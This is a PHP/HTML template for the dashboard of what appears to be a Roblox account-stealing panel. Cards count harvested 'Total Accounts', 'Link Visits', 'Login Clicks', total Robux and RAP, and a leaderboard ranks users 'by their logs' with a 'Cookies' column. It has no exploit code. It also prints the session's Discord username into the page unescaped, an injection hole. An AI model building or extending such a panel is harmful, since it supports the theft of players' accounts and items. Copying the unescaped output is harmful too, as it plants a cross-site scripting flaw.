<div>
  <div>
    <h1 class="text-3xl font-bold text-white mb-2">Hey, <?=$_SESSION["info"]["discord_username"];?>!</h1>
    <p class="text-zinc-400 mb-6">
      
    </p>
  </div>

  <!--  -->
  <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
    <div class="bg-black/30 border border-white/10 rounded-lg p-4">
      <div class="flex justify-between items-center mb-2">
        <h2 class="text-sm font-medium">Total Accounts</h2>
      </div>
      <div class="text-2xl font-bold mb-2" id="total-accounts"></div>
      <div class="h-16 mb-2 flex items-end space-x-1" id="graph-accounts"></div>
      <div class="flex justify-between items-center text-xs">
        <span class="text-gray-500" id="today-accounts"></span>
        <span
          id="percent-today-accounts"
          class="bg-blue-900 text-blue-300 bg-opacity-50 px-2 py-1 rounded-full hidden"
        ></span>
      </div>
    </div>

    <div class="bg-black/30 border border-white/10 rounded-lg p-4">
      <div class="flex justify-between items-center mb-2">
        <h2 class="text-sm font-medium">Link Visits</h2>
      </div>
      <div class="text-2xl font-bold mb-2" id="total-visits"></div>
      <div class="h-16 mb-2 flex items-end space-x-1" id="graph-visits"></div>
      <div class="flex justify-between items-center text-xs">
        <span class="text-gray-500" id="today-visits"></span>
        <span
          class="bg-blue-900 text-blue-300 bg-opacity-50 px-2 py-1 rounded-full hidden"
          id="percent-today-visits"
        ></span>
      </div>
    </div>

    <div class="bg-black/30 border border-white/10 rounded-lg p-4">
      <div class="flex justify-between items-center mb-2">
        <h2 class="text-sm font-medium">Login Clicks</h2>
      </div>
      <div class="text-2xl font-bold mb-2" id="total-clicks"></div>
      <div class="h-16 mb-2 flex items-end space-x-1" id="graph-clicks"></div>
      <div class="flex justify-between items-center text-xs">
        <span class="text-gray-500" id="today-clicks"></span>
        <span
          id="percent-today-clicks"
          class="bg-blue-900 text-blue-300 bg-opacity-50 px-2 py-1 rounded-full hidden"
        ></span>
      </div>
    </div>

    <div class="bg-black/30 border border-white/10 rounded-lg p-4">
      <div class="flex justify-between items-center mb-5">
        <h2 class="text-sm font-medium">Other Statistics</h2>
      </div>

      <div class="grid grid-cols-2 py-2 border-b border-zinc-800">
        <span class="text-zinc-400 text-xs">Total RAP</span>
        <span
          class="text-white text-right text-sm font-medium"
          id="data-rap"
        ></span>
      </div>
      <div class="grid grid-cols-2 py-2 border-b border-zinc-800">
        <span class="text-zinc-400 text-xs">Total Robux</span>
        <span
          class="text-white text-right text-sm font-medium"
          id="data-robux"
        ></span>
      </div>
      <div class="grid grid-cols-2 py-2">
        <span class="text-zinc-400 text-xs">Summary</span>
        <span
          class="text-white text-right text-sm font-medium"
          id="data-summary"
        ></span>
      </div>
    </div>
  </div>

  <div class="pt-11">
    <div
      class="w-full mx-auto border border-white/10 rounded-lg overflow-hidden"
    >
      <div class="bg-black/30 p-6">
        <h1 class="text-3xl font-bold text-white mb-2">Leaderboard</h1>
        <p class="text-zinc-400">
          Top users ranked by their logs.
        </p>
      </div>

<div class="w-full overflow-x-auto">
                <table class="w-full text-sm text-left text-zinc-300 whitespace-nowrap" id="leaderboard-table">
                    <thead class="text-xs uppercase bg-white/5">
                        <tr>
                            <th scope="col" class="px-6 py-3">User</th>
                            <th scope="col" class="px-6 py-3">Status</th>
                            <th scope="col" class="px-6 py-3">Level</th>
                            <th scope="col" class="px-6 py-3">Cookies</th>
                        </tr>
                    </thead>
                    <tbody>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</div>